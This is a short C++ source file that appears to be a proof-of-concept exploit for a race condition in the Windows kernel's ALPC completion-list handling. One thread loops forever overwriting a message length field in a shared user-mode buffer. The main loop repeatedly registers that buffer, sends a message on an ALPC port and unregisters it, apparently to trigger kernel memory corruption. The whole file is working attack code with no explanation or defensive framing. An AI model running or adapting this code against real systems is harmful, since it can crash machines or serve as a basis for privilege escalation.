#include <Windows.h>
#include <phnt.h>
#include <stdio.h>

#pragma comment(lib, "ntdll")

#define MIN_COMPLETION_LIST_BUFFER_SIZE 0x4000

PVOID alpc_completion_list_buffer = 0;

DWORD WINAPI OverwriteThread(LPVOID Param) {
  PPORT_MESSAGE port_message = nullptr;

  if (!alpc_completion_list_buffer) {
    return -1;
  }

  PALPC_COMPLETION_LIST_HEADER completion_list_header =
      (PALPC_COMPLETION_LIST_HEADER) alpc_completion_list_buffer;

  
  port_message = (PPORT_MESSAGE)((PCHAR)alpc_completion_list_buffer +
                                 completion_list_header->DataOffset);

  while (1) {
    port_message->u1.s1.TotalLength = 0xFFFF;
  }

  return 0;
}

int main(int argc, char* argv[]) {
  NTSTATUS status = 0;
  HANDLE alpc_port;
  ALPC_PORT_ATTRIBUTES port_attributes{};
  ALPC_PORT_COMPLETION_LIST_INFORMATION completion_list_information{};
  PORT_MESSAGE send_message{};

  port_attributes.Flags = 0;
  port_attributes.MaxMessageLength = 0x1000;

  status = NtAlpcCreatePort(&alpc_port, NULL, &port_attributes);

  if (NT_ERROR(status)) {
    return -1;
  }

  alpc_completion_list_buffer = VirtualAlloc(0, 0x4000, MEM_COMMIT, PAGE_READWRITE);
  if (!alpc_completion_list_buffer || (ULONG)alpc_completion_list_buffer & 0xFFF) {
    if (alpc_completion_list_buffer) {
      VirtualFree(alpc_completion_list_buffer, 0x4000, MEM_FREE);
    }
    return -1;
  }

  CloseHandle(CreateThread(0, 0, OverwriteThread, 0, 0, 0));

  completion_list_information.AttributeFlags = 0x20000000;
  completion_list_information.ConcurrencyCount = 1;
  completion_list_information.Size = 0x4000;
  completion_list_information.Buffer = alpc_completion_list_buffer;

  while (1) {
    
    send_message.u1.s1.DataLength = 0;
    send_message.u1.s1.TotalLength = sizeof(PORT_MESSAGE);

    status = NtAlpcSetInformation(alpc_port, AlpcRegisterCompletionListInformation,
                             &completion_list_information, sizeof(ALPC_PORT_COMPLETION_LIST_INFORMATION));

    status = NtAlpcSendWaitReceivePort(alpc_port, 0, &send_message, 0, 0, 0, 0, 0);
    status = NtAlpcSetInformation( alpc_port, AlpcUnregisterCompletionListInformation, NULL, 0);
  }

  return 0;
}